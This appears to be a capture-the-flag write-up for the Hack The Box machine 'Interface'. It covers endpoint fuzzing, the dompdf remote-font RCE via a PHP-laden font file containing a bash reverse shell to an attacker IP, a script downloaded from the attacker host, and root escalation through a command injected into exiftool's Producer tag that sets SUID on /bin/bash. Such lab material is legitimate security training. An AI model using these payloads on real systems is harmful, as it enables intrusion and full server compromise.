- Let's add the proper endpoint to `/etc/hosts`

```bash
echo "10.10.11.200	interface.htb" | sudo tee -a /etc/hosts
```

- Let's start `autorecon` in the background:

```bash
sudo (which autorecon) interface.htb
```

- We can immediately see port `80` open.
- Upon visiting the site there doesn't seem to be much to go off of.
- Within the burp request to `http://interface.htb` we see a new endpoint in the `CSP (Content-Security-Policy` header.

```bash
http://prd.m.rendering-api.interface.htb
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230312203031.png)

- Let's change our `/etc/hosts` file to resemble:

```bash
10.10.11.200	interface.htb prd.m.rendering-api.interface.htb
```

- When we visit the endpoint `prd.m.rendering-api.interface.htb` we see a `404` with an error message saying `File not found.`
- Using `ffuf` this time we can observe numerous endpoints with `403` errors signifying that they are present.

```bash
ffuf -u http://prd.m.rendering-api.interface.htb/FUZZ -X POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fc 404

http://prd.m.rendering-api.interface.htb/FUZZ

[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 44ms]
    * FUZZ: vendor
```


```bash
ffuf -u http://prd.m.rendering-api.interface.htb/vendor/FUZZ -X POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fc 404

http://prd.m.rendering-api.interface.htb/vendor/FUZZ

[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 44ms]
    * FUZZ: dompdf

[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 46ms]
    * FUZZ: composer
```

```bash
ffuf -u http://prd.m.rendering-api.interface.htb/vendor/dompdf/FUZZ -X POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fc 404

http://prd.m.rendering-api.interface.htb/vendor/dompdf/FUZZ

[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 42ms]
    * FUZZ: dompdf
```

```bash
ffuf -u http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/FUZZ -X POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fc 404

http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/FUZZ

[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 59ms]
    * FUZZ: lib

[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 46ms]
    * FUZZ: tests

[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 45ms]
    * FUZZ: src
```

```bash
ffuf -u http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/FUZZ -X POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fc 404

http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/FUZZ

[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 43ms]
    * FUZZ: fonts

[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 43ms]
    * FUZZ: res
```

```bash
ffuf -u http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/tests/FUZZ -X POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fc 404

http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/tests/FUZZ

[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 95ms]
    * FUZZ: _files
```

#### `api` endpoint found filtering by size

```bash
ffuf -u http://prd.m.rendering-api.interface.htb/FUZZ -X POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fs 0,16

http://prd.m.rendering-api.interface.htb/FUZZ

[Status: 404, Size: 50, Words: 3, Lines: 1, Duration: 61ms]
    * FUZZ: api

[Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 44ms]
    * FUZZ: vendor
```

```bash
ffuf -u http://prd.m.rendering-api.interface.htb/api/FUZZ -X POST -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -mc all -fs 50

http://prd.m.rendering-api.interface.htb/api/FUZZ

[Status: 422, Size: 36, Words: 2, Lines: 1, Duration: 48ms]
    * FUZZ: html2pdf
```

- GoogleFu
	- `dompdf exploit`
	- The second search option leads us too:
		- [[https://github.com/positive-security/dompdf-rce]]
		- [[https://positive.security/blog/dompdf-rce]]

- The `dompdf` `php` library has a total of `59.2k` dependent repositories, yet didn't acknowledge this exploitable feature after being contacted. So this blog was posted to explain as a POC.
- Here is the vulnerable code:

```php
public function registerFont($style, $remoteFile, $context = null)
{
   $fontname = mb_strtolower($style["family"]);
   $styleString = $this->getType("{$style['weight']} {$style['style']}");

   $fontDir = $this->options->getFontDir();
   $remoteHash = md5($remoteFile);

   $prefix = $fontname . "_" . $styleString;
   $prefix = preg_replace("[\\W]", "_", $prefix);
   $prefix = preg_replace("/[^-_\\w]+/", "", $prefix);

   $localFile = $fontDir . "/" . $prefix . "_" . $remoteHash;
   $localFile .= ".".strtolower(pathinfo(parse_url($remoteFile, PHP_URL_PATH), PATHINFO_EXTENSION));
```

- Basically, there is a variable named `$isRemoteEnabled` that is enabled by default during this version and prior too. This, combined with `dompdf` which allows for the loading of custom fonts through `css` similar to what's displayed below. Also as explained within the blog post:
	- [[https://positive.security/blog/dompdf-rce]]

```css
@font-face {
   font-family:'TestFont';
   src:url('http://attacker.local/test_font.ttf');
   font-weight:'normal';
   font-style:'normal';
 }
```

- Furthermore, by knowing the `fonts` endpoint (from our previous `fuff` fuzzing) and the file structure of the file:
	- `/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_489219dafeba9112ed42c17f33b10a0b.php`
- After executing the `css` exploit which would in turn upload the above file you then would simply visit the above endpoint to get a reverse-shell.
- Note, `489219dafeba9112ed42c17f33b10a0b` is based off of their POC where they obtain the `phpinfo` versus our future `reverse-shell`.
- I recommend reading up on the blog post it is put together well.

- First let's clone the repository:

```bash
git clone https://github.com/positive-security/dompdf-rce.git
cd exploit
```

- Adjust `exploit.css` to resemble:

```css
@font-face {
    font-family:'exploitfont';
    src:url('http://10.10.16.26/exploit_font.php');
    font-weight:'normal';
    font-style:'normal';
  }
```

- Similarly, `exploit_font.php`:
	- Note I used the `hack-tricks` extension for a quick and convenient reverse-shell.

```php

� dum1�cmap
           `�,glyf5sc��head�Q6�6hhea��($hmtxD
loca
Tmaxp\ nameD�|8dum2�
                     -��-����
:83#5:08��_<�
             @�8�&۽
:8L��

:D

6				s
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.26/4444 0>&1'");?>
```

- Following the directions of the blog obtain the `md5sum` of `exploit_font.php`:

```bash
echo -n "http://10.10.16.26/exploit_font.php" | md5sum

0231eacba09bc4c54f7573512d14c42a
```

- Once this is accomplished open up a `python` simple server within the `/dompdf-rce/exploit` directory.

- Host

```bash
python -m http.server 80
```

- In `burp` repeater I have two tabs one for:
	- `/api/html2pdf`
	- `/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_0231eacba09bc4c54f7573512d14c42a.php`

#### `/api/html2pdf`

```bash
POST /api/html2pdf HTTP/1.1
Host: prd.m.rendering-api.interface.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
X-Forwarded-For: 10.10.16.26
Connection: close
Content-Length: 83

{  
"html":   "<link rel=stylesheet href='http://10.10.16.26/exploit.css'>"  
}  
```

#### `/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_0231eacba09bc4c54f7573512d14c42a.php`

```bash
GET /vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_0231eacba09bc4c54f7573512d14c42a.php  HTTP/1.1
Host: prd.m.rendering-api.interface.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
X-Forwarded-For: 10.10.16.26
Connection: close
Content-Length: 0


```

- Start up a reverse shell in preparation:

```bash
rlwrap nc -lvnp 4444
```

- Now execute the two `burp` requests in this order:
	- `/api/html2pdf`
		- After execution observe the hits on your `python` simple server.
	- `/vendor/dompdf/dompdf/lib/fonts/exploitfont_normal_0231eacba09bc4c54f7573512d14c42a.php`

![image](https://0xc0rvu5.github.io/docs/assets/images/20230312210044.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20230312210127.png)

- For the sake of `pspy64` let's repeat this process an additional time with a separate `port` and `md5sum`.
- We can navigate to `/home/dev` and grab the `user.txt` flag.

```bash
# activate clear functionality
export TERM=xterm
ls /home
cd /home/dev
cat /home/dev/user.txt

58aa856e616a3454d1bcc592d6ca6ff9
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230519205924.png)

- Note, `linpeas.sh` output didn't offer much.
- Let's focus on the `pspy64` output.
- Whenever you execute the `/api/html2pdf` endpoint you will see something similar to:

#### `pspy64` output

```bash
CMD: UID=0     PID=2296   | /usr/bin/perl -w /usr/bin/exiftool -s -s -s -Producer /tmp/e1eabe82754685211e30c8b7fb3f4d6b.pdf 
```

- Let's see what happens if we make a random file in the `/tmp` directory:

```bash
touch /tmp/test
```

#### `pspy64` output

```bash
2023/03/13 02:32:01 CMD: UID=0     PID=2349   | /usr/bin/perl -w /usr/bin/exiftool -s -s -s -Producer /tmp/test
```
 
- This output verifies that it will interact with any files we put into the `/tmp` directory.
- If we fire off a `POST` request to `/api/html2pdf` then immediately call `exiftool` on the `pdf` file it creates it looks similar to this output:

```bash
exiftool e1eabe82754685211e30c8b7fb3f4d6b.pdf

ExifTool Version Number         : 12.55
File Name                       : e1eabe82754685211e30c8b7fb3f4d6b.pdf
Directory                       : .
File Size                       : 919 bytes
File Modification Date/Time     : 2023:03:13 02:51:08+00:00
File Access Date/Time           : 2023:03:13 02:51:08+00:00
File Inode Change Date/Time     : 2023:03:13 02:51:08+00:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.7
Linearized                      : No
Page Count                      : 1
Producer                        : dompdf 1.2.0 + CPDF
Create Date                     : 2023:03:13 02:51:08+00:00
Modify Date                     : 2023:03:13 02:51:08+00:00
```

- Putting a reverse-shell in the comment area doesn't work.
- We see here that there is a `Producer` category which corresponds to the `-Producer` flag within the `pspy64` output.
- With this knowledge let's create a new file and direct the payload to `/dev/shm/test.sh` where we have a file which will add the `SUID` bit to `/bin/bash` allowing us to escalate our privileges!
- Since we don't have a stable shell on host create a file with the aforementioned functionality.

- Host:

```bash
cat test.sh

#!/bin/bash
chmod a+s /bin/bash

python -m http.server 80
```

- Victim:

```bash
cd /dev/shm
wget http://10.10.16.26/test.sh
chmod 700 test.sh
```

```bash
touch test
exiftool test

ExifTool Version Number         : 12.55
File Name                       : test
Directory                       : .
File Size                       : 0 bytes
File Modification Date/Time     : 2023:03:12 23:35:12+00:00
File Access Date/Time           : 2023:03:12 23:35:14+00:00
File Inode Change Date/Time     : 2023:03:12 23:35:14+00:00
File Permissions                : -rw-r--r--
Error                           : File is empty

```

```bash
exiftool -Producer="v[\$(/dev/shm/test.sh>&2)]" test
```

- The reason the brackets `[]` are necessary in the command `exiftool -Producer="v[\$(/dev/shm/test.sh>&2)]" test` is because they are used to prevent the shell from interpreting the `$(` and `)` characters as special characters.

- When you run a command in a Unix-based shell, the shell will interpret any special characters in the command before passing it to the command itself. In this case, the `$(` and `)` characters are special characters that are used to indicate command substitution. Whn the shell encounters these characters, it will execute the command inside the parentheses and replace the command substitution with the output of the command.

- In order for the `exiftool` command to execute the command inside the `$()` expression, it needs to have an executable command that can be executed by the shell. By adding the `v` character in front of the `$()` expression, a dummy command  is created `v` that can be executed by the shell and then passing the command substitution expression as an argument to that dummy command.

- So when you use the command `exiftool -Producer="v[\$(/dev/shm/test.sh>&2)]" test`, `exiftool` will first execute the dummy command `v` (which does nothing), and then pass the command substitution expression `[\$(/dev/shm/test.sh>&2)]` as an argument to the `v` command. The shell will then execute the command inside the parentheses and replace the command substitution with its output, which will be sent to the `v` command as an argument. Since the `v` command does nothing, the output of the command substitution will not be displayed or otherwise processed.

```bash
exiftool test

ExifTool Version Number         : 12.55
File Name                       : test
Directory                       : .
File Size                       : 2.9 kB
File Modification Date/Time     : 2023:03:12 23:35:14+00:00
File Access Date/Time           : 2023:03:13 00:17:37+00:00
File Inode Change Date/Time     : 2023:03:12 23:35:14+00:00
File Permissions                : -rw-r--r--
File Type                       : EXV
File Type Extension             : exv
MIME Type                       : image/x-exv
XMP Toolkit                     : Image::ExifTool 12.55
Producer                        : a[$(/dev/shm/test.sh>&2)]
```

```bash
cp test /tmp/test
```

- After the previous steps are completed be sure to fire off one of your `/api/html2pdf` endpoints within `burp` then observe in `pspy64` that `/dev/shm/test.sh` will be executed by root ultimately leading to root!

![image](https://0xc0rvu5.github.io/docs/assets/images/20230312214241.png)

- Happy hacking!

```bash
cat /home/dev/user.txt

********************************

cat /root/root.txt

********************************
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230519201520.png)

#hacking
